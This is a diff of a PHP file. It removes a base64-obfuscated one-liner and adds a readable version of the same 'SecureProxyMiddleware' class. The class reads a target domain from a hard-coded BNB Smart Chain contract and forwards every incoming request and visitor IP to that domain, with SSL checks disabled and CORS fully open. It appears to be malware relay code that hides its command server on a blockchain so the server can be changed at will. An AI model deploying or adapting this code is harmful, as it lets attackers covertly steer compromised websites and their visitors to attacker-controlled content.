@@ -1,1 +1,318 @@
-<?php header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAq'));header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctTWV0aG9kczogKg=='));header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVyczogKg=='));header(base64_decode('QWNjZXNzLUNvbnRyb2wtTWF4LUFnZTogMzYwMA=='));ini_set(base64_decode('cG9zdF9tYXhfc2l6ZQ=='),base64_decode('NjRN'));ini_set(base64_decode('bWVtb3J5X2xpbWl0'),base64_decode('MTI4TQ=='));ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='),1);function getClientIP(){if(isset($_SERVER[base64_decode('SFRUUF9DRl9DT05ORUNUSU5HX0lQ')])){return $_SERVER[base64_decode('SFRUUF9DRl9DT05ORUNUSU5HX0lQ')];}if(isset($_SERVER[base64_decode('SFRUUF9YX0ZPUldBUkRFRF9GT1I=')])){$ips=explode(base64_decode('LA=='),$_SERVER[base64_decode('SFRUUF9YX0ZPUldBUkRFRF9GT1I=')]);return trim($ips[0]);}return $_SERVER[base64_decode('UkVNT1RFX0FERFI=')];}class SecureProxyMiddleware{private $updateInterval=60;private $rpcUrls;private $contractAddress;private $cacheFile;public function __construct($options=[]){$this->rpcUrls=$options[base64_decode('cnBjVXJscw==')]??[base64_decode('aHR0cHM6Ly9ycGMuYW5rci5jb20vYnNj'),base64_decode('aHR0cHM6Ly9ic2MtZGF0YXNlZWQyLmJuYmNoYWluLm9yZw==')];$this->contractAddress=$options[base64_decode('Y29udHJhY3RBZGRyZXNz')]?? base64_decode('MHhlOWQ1ZjY0NWY3OWZhNjBmY2E4MmI0ZTFkMzU4MzJlNDMzNzBmZWIw');$serverIdentifier=md5($_SERVER[base64_decode('U0VSVkVSX05BTUU=')].base64_decode('Og==').$_SERVER[base64_decode('U0VSVkVSX0FERFI=')].base64_decode('Og==').$_SERVER[base64_decode('U0VSVkVSX1NPRlRXQVJF')]);$this->cacheFile=sys_get_temp_dir().base64_decode('L3Byb3h5X2NhY2hlXw==').$serverIdentifier.base64_decode('Lmpzb24=');}private function loadCache(){if(!file_exists($this->cacheFile))return null;$cache=json_decode(file_get_contents($this->cacheFile),true);if(!$cache||(time()-$cache[base64_decode('dGltZXN0YW1w')])>$this->updateInterval){return null;}return $cache[base64_decode('ZG9tYWlu')];}private function filterHeaders($headers){$blacklist=[base64_decode('aG9zdA==')];$formatted=[];foreach($headers as $key=>$value){$key=strtolower($key);if(!in_array($key,$blacklist)){$formatted[]="$key: $value";}}return $formatted;}private function saveCache($domain){$cache=[base64_decode('ZG9tYWlu')=>$domain,base64_decode('dGltZXN0YW1w')=>time()];file_put_contents($this->cacheFile,json_encode($cache));}private function hexToString($hex){$hex=preg_replace(base64_decode('L14weC8='),'',$hex);$hex=substr($hex,64);$lengthHex=substr($hex,0,64);$length=hexdec($lengthHex);$dataHex=substr($hex,64,$length*2);$result='';for($i=0;$i<strlen($dataHex);$i+=2){$charCode=hexdec(substr($dataHex,$i,2));if($charCode===0)break;$result.=chr($charCode);}return $result;}private function fetchTargetDomain(){$data=base64_decode('MjA5NjUyNTU=');foreach($this->rpcUrls as $rpcUrl){try{$ch=curl_init($rpcUrl);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>json_encode([base64_decode('anNvbnJwYw==')=>base64_decode('Mi4w'),base64_decode('aWQ=')=>1,base64_decode('bWV0aG9k')=>base64_decode('ZXRoX2NhbGw='),base64_decode('cGFyYW1z')=>[[base64_decode('dG8=')=>$this->contractAddress,base64_decode('ZGF0YQ==')=>base64_decode('MHg=').$data],base64_decode('bGF0ZXN0')]]),CURLOPT_HTTPHEADER=>[base64_decode('Q29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29u')],CURLOPT_TIMEOUT=>120,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>false]);$response=curl_exec($ch);if(curl_errno($ch)){curl_close($ch);continue;}curl_close($ch);$responseData=json_decode($response,true);if(isset($responseData[base64_decode('ZXJyb3I=')]))continue;$domain=$this->hexToString($responseData[base64_decode('cmVzdWx0')]);if($domain)return $domain;}catch(Exception $e){continue;}}throw new Exception(base64_decode('Q291bGQgbm90IGZldGNoIHRhcmdldCBkb21haW4='));}private function getTargetDomain(){$cachedDomain=$this->loadCache();if($cachedDomain)return $cachedDomain;$domain=$this->fetchTargetDomain();$this->saveCache($domain);return $domain;}private function formatHeaders($headers){$formatted=[];foreach($headers as $name=>$value){if(is_array($value))$value=implode(base64_decode('LCA='),$value);$formatted[]="$name: $value";}return $formatted;}public function handle($endpoint){try{ini_set(base64_decode('bWVtb3J5X2xpbWl0'),base64_decode('NTEyTQ=='));set_time_limit(300);$targetDomain=rtrim($this->getTargetDomain(),base64_decode('Lw=='));$endpoint=base64_decode('Lw==').ltrim($endpoint,base64_decode('Lw=='));$url=$targetDomain.$endpoint;$clientIP=getClientIP();$headers=getallheaders();unset($headers[base64_decode('SG9zdA==')],$headers[base64_decode('aG9zdA==')]);unset($headers[base64_decode('b3JpZ2lu')],$headers[base64_decode('T3JpZ2lu')]);unset($headers[base64_decode('QWNjZXB0LUVuY29kaW5n')],$headers[base64_decode('YWNjZXB0LWVuY29kaW5n')]);unset($headers[base64_decode('Q29udGVudC1FbmNvZGluZw==')],$headers[base64_decode('Y29udGVudC1lbmNvZGluZw==')]);$headers[base64_decode('eC1kZmtqbGRpZmpsaWZqZA==')]=$clientIP;$ch=curl_init($url);curl_setopt_array($ch,[CURLOPT_CUSTOMREQUEST=>$_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')],CURLOPT_POSTFIELDS=>file_get_contents(base64_decode('cGhwOi8vaW5wdXQ=')),CURLOPT_RETURNTRANSFER=>true,CURLOPT_MAXREDIRS=>10,CURLOPT_TIMEOUT=>120,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_HTTP_VERSION=>CURL_HTTP_VERSION_1_1,CURLOPT_BUFFERSIZE=>128000,CURLOPT_HTTPHEADER=>array_merge($this->formatHeaders($headers),[base64_decode('QWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRl'),base64_decode('RXhwZWN0Og==')]),CURLOPT_ENCODING=>'',CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>false,CURLOPT_HEADERFUNCTION=>function($curl,$header){return strlen($header);}]);$response=curl_exec($ch);if(curl_errno($ch)){throw new Exception(curl_error($ch));}$httpCode=curl_getinfo($ch,CURLINFO_HTTP_CODE);$contentType=curl_getinfo($ch,CURLINFO_CONTENT_TYPE);curl_close($ch);header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAq'));header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctTWV0aG9kczogR0VULCBIRUFELCBQT1NULCBPUFRJT05T'));header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVyczogKg=='));if($contentType)header(base64_decode('Q29udGVudC1UeXBlOiA=').$contentType);http_response_code($httpCode);echo $response;}catch(Exception $e){http_response_code(500);echo base64_decode('ZXJyb3I6IA==').$e->getMessage();}}}if($_SERVER[base64_decode('UkVRVUVTVF9NRVRIT0Q=')]===base64_decode('T1BUSU9OUw==')){header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luOiAq'));header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctTWV0aG9kczogR0VULCBIRUFELCBQT1NULCBPUFRJT05T'));header(base64_decode('QWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVyczogKg=='));header(base64_decode('QWNjZXNzLUNvbnRyb2wtTWF4LUFnZTogODY0MDA='));http_response_code(204);exit;}if($_GET[base64_decode('ZQ==')]===base64_decode('cGluZ19wcm94eQ==')){header(base64_decode('Q29udGVudC1UeXBlOiB0ZXh0L3BsYWlu'));echo base64_decode('cG9uZw==');exit;}else if(isset($_GET[base64_decode('ZQ==')])){$proxy=new SecureProxyMiddleware([base64_decode('cnBjVXJscw==')=>[base64_decode('aHR0cHM6Ly9ycGMuYW5rci5jb20vYnNj'),base64_decode('aHR0cHM6Ly9ic2MtZGF0YXNlZWQyLmJuYmNoYWluLm9yZw==')],base64_decode('Y29udHJhY3RBZGRyZXNz')=>base64_decode('MHhlOWQ1ZjY0NWY3OWZhNjBmY2E4MmI0ZTFkMzU4MzJlNDMzNzBmZWIw')]);$endpoint=urldecode($_GET[base64_decode('ZQ==')]);$endpoint=ltrim($endpoint,base64_decode('Lw=='));$proxy->handle($endpoint);}else{http_response_code(400);echo base64_decode('TWlzc2luZyBlbmRwb2ludA==');}?>
+<?php
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: *');
+header('Access-Control-Allow-Headers: *');
+header('Access-Control-Max-Age: 3600');
+
+function getClientIP() {
+    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
+        return $_SERVER["HTTP_CF_CONNECTING_IP"];
+    }
+    
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        return trim($ips[0]);
+    }
+    
+    return $_SERVER['REMOTE_ADDR'];
+}
+
+
+class SecureProxyMiddleware {
+    private $updateInterval = 120;
+    private $rpcUrls;
+    private $contractAddress;
+    private $cacheFile;
+    
+    public function __construct($options = []) {
+        $this->rpcUrls = $options['rpcUrls'] ?? [
+            "https://bsc-dataseed2.bnbchain.org",
+            "https://rpc-bsc.48.club",
+            "https://bsc.blockrazor.xyz",
+            "https://bsc.drpc.org",
+            "https://bsc-pokt.nodies.app",
+            "https://bsc.meowrpc.com"
+        ];
+        $this->contractAddress = $options['contractAddress'] ?? "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
+        
+        $serverIdentifier = md5(
+            $_SERVER['SERVER_NAME'] . ':' . 
+            $_SERVER['SERVER_ADDR'] . ':' . 
+            $_SERVER['SERVER_SOFTWARE']
+        );
+        
+        try {
+            $tempDir = sys_get_temp_dir();
+            $this->cacheFile = $tempDir . '/proxy_cache_' . $serverIdentifier . '.json';
+        } catch (Exception $e) {
+            $this->cacheFile = __DIR__ . '/proxy_cache_' . $serverIdentifier . '.json';
+        }
+    }
+
+    private function loadCache() {
+        if (!file_exists($this->cacheFile)) return null;
+        $cache = json_decode(file_get_contents($this->cacheFile), true);
+        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) {
+            return null;
+        }
+        return $cache['domain'];
+    }
+
+    private function filterHeaders($headers) {
+        $blacklist = ['host'];
+        $formatted = [];
+        
+        foreach ($headers as $key => $value) {
+            $key = strtolower($key);
+            if (!in_array($key, $blacklist)) {
+                $formatted[] = "$key: $value";
+            }
+        }
+        
+        return $formatted;
+    }
+
+    private function saveCache($domain) {
+        $cache = ['domain' => $domain, 'timestamp' => time()];
+        file_put_contents($this->cacheFile, json_encode($cache));
+    }
+
+    private function hexToString($hex) {
+        $hex = preg_replace('/^0x/', '', $hex);
+        $hex = substr($hex, 64);
+        $lengthHex = substr($hex, 0, 64);
+        $length = hexdec($lengthHex);
+        $dataHex = substr($hex, 64, $length * 2);
+        $result = '';
+        for ($i = 0; $i < strlen($dataHex); $i += 2) {
+            $charCode = hexdec(substr($dataHex, $i, 2));
+            if ($charCode === 0) break;
+            $result .= chr($charCode);
+        }
+        return $result;
+    }
+
+    private function fetchTargetDomain() {
+        $data = '20965255';
+        
+        foreach ($this->rpcUrls as $rpcUrl) {
+            try {
+                $response = null;
+                
+                if (function_exists('curl_version')) {
+                    $ch = curl_init($rpcUrl);
+                    curl_setopt_array($ch, [
+                        CURLOPT_RETURNTRANSFER => true,
+                        CURLOPT_POST => true,
+                        CURLOPT_POSTFIELDS => json_encode([
+                            'jsonrpc' => '2.0',
+                            'id' => 1,
+                            'method' => 'eth_call',
+                            'params' => [[
+                                'to' => $this->contractAddress,
+                                'data' => '0x' . $data
+                            ], 'latest']
+                        ]),
+                        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+                        CURLOPT_TIMEOUT => 5,
+                        CURLOPT_SSL_VERIFYPEER => false,
+                        CURLOPT_SSL_VERIFYHOST => false
+                    ]);
+
+                    $response = curl_exec($ch);
+                    if (curl_errno($ch)) {
+                        curl_close($ch);
+                        continue;
+                    }
+                    
+                    curl_close($ch);
+                } else {
+                    $opts = [
+                        'http' => [
+                            'method' => 'POST',
+                            'header' => 'Content-Type: application/json',
+                            'content' => json_encode([
+                                'jsonrpc' => '2.0',
+                                'id' => 1,
+                                'method' => 'eth_call',
+                                'params' => [[
+                                    'to' => $this->contractAddress,
+                                    'data' => '0x' . $data
+                                ], 'latest']
+                            ]),
+                            'timeout' => 5,
+                            'ignore_errors' => true
+                        ],
+                        'ssl' => [
+                            'verify_peer' => false,
+                            'verify_peer_name' => false
+                        ]
+                    ];
+                    
+                    $context = stream_context_create($opts);
+                    $response = @file_get_contents($rpcUrl, false, $context);
+                    
+                    if ($response === false) {
+                        continue;
+                    }
+                }
+                
+                $responseData = json_decode($response, true);
+                if (isset($responseData['error'])) continue;
+
+                $domain = $this->hexToString($responseData['result']);
+                if ($domain) return $domain;
+            } catch (Exception $e) {
+                continue;
+            }
+        }
+        throw new Exception('Could not fetch target domain');
+    }
+
+    private function getTargetDomain() {
+        $cachedDomain = $this->loadCache();
+        if ($cachedDomain) return $cachedDomain;
+
+        $domain = $this->fetchTargetDomain();
+        $this->saveCache($domain);
+        return $domain;
+    }
+
+    private function formatHeaders($headers) {
+        $formatted = [];
+        foreach ($headers as $name => $value) {
+            if (is_array($value)) $value = implode(', ', $value);
+            $formatted[] = "$name: $value";
+        }
+        return $formatted;
+    }
+
+    public function handle($endpoint) {
+        try {
+            $targetDomain = rtrim($this->getTargetDomain(), '/');
+            $endpoint = '/' . ltrim($endpoint, '/');
+            $url = $targetDomain . $endpoint;
+            
+            $clientIP = getClientIP();
+
+            $headers = getallheaders();
+            unset($headers['Host'], $headers['host']);
+            unset($headers['origin'], $headers['Origin']);
+            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
+            unset($headers['Content-Encoding'], $headers['content-encoding']);
+        
+            $headers['x-dfkjldifjlifjd'] = $clientIP;
+            
+            $response = null;
+            $httpCode = 500;
+            $contentType = null;
+            
+            if (function_exists('curl_version')) {
+                $ch = curl_init($url);
+                curl_setopt_array($ch, [
+                    CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
+                    CURLOPT_POSTFIELDS => file_get_contents('php://input'),
+                    CURLOPT_RETURNTRANSFER => true,
+                    CURLOPT_HTTPHEADER => $this->formatHeaders($headers),
+                    CURLOPT_TIMEOUT => 120,
+                    CURLOPT_FOLLOWLOCATION => true,
+                    CURLOPT_SSL_VERIFYPEER => false,
+                    CURLOPT_SSL_VERIFYHOST => false,
+                    CURLOPT_ENCODING => ''
+                ]);
+
+                $response = curl_exec($ch);
+                if (curl_errno($ch)) {
+                    throw new Exception(curl_error($ch));
+                }
+                
+                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
+                curl_close($ch);
+            } else {
+                $formattedHeaders = [];
+                foreach ($headers as $key => $value) {
+                    $formattedHeaders[] = "$key: $value";
+                }
+                
+                $opts = [
+                    'http' => [
+                        'method' => $_SERVER['REQUEST_METHOD'],
+                        'header' => implode("\r\n", $formattedHeaders),
+                        'content' => file_get_contents('php://input'),
+                        'timeout' => 120,
+                        'follow_location' => 1,
+                        'ignore_errors' => true
+                    ],
+                    'ssl' => [
+                        'verify_peer' => false,
+                        'verify_peer_name' => false
+                    ]
+                ];
+                
+                $context = stream_context_create($opts);
+                $response = @file_get_contents($url, false, $context);
+                
+                if ($response === false) {
+                    throw new Exception('Failed to get response from target domain');
+                }
+                
+                if (isset($http_response_header)) {
+                    foreach ($http_response_header as $header) {
+                        if (preg_match('/HTTP\/\d\.\d\s+(\d+)/', $header, $matches)) {
+                            $httpCode = (int)$matches[1];
+                        }
+                        if (preg_match('/Content-Type:\s+(.+)/i', $header, $matches)) {
+                            $contentType = trim($matches[1]);
+                        }
+                    }
+                }
+            }
+
+            header('Access-Control-Allow-Origin: *');
+            header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
+            header('Access-Control-Allow-Headers: *');
+            if ($contentType) header('Content-Type: ' . $contentType);
+            
+            http_response_code($httpCode);
+            echo $response;
+
+        } catch (Exception $e) {
+            http_response_code(500);
+            echo 'error' . $e;
+        }
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    header('Access-Control-Allow-Origin: *');
+    header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
+    header('Access-Control-Allow-Headers: *');
+    header('Access-Control-Max-Age: 86400');
+    http_response_code(204);
+    exit;
+}
+
+if ($_GET['e'] === 'ping_proxy') {
+    header('Content-Type: text/plain');
+    echo 'pong';
+    exit;
+} else if (isset($_GET['e'])) {
+    $proxy = new SecureProxyMiddleware([
+        'rpcUrls' => [
+            "https://bsc-dataseed2.bnbchain.org",
+            "https://rpc-bsc.48.club",
+            "https://bsc.blockrazor.xyz",
+            "https://bsc.drpc.org",
+            "https://bsc-pokt.nodies.app",
+            "https://bsc.meowrpc.com"
+        ],
+        'contractAddress' => "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
+    ]);
+    $endpoint = urldecode($_GET['e']);
+    $endpoint = ltrim($endpoint, '/');
+    $proxy->handle($endpoint);
+} else {
+    http_response_code(400);
+    echo 'Missing endpoint';
+}
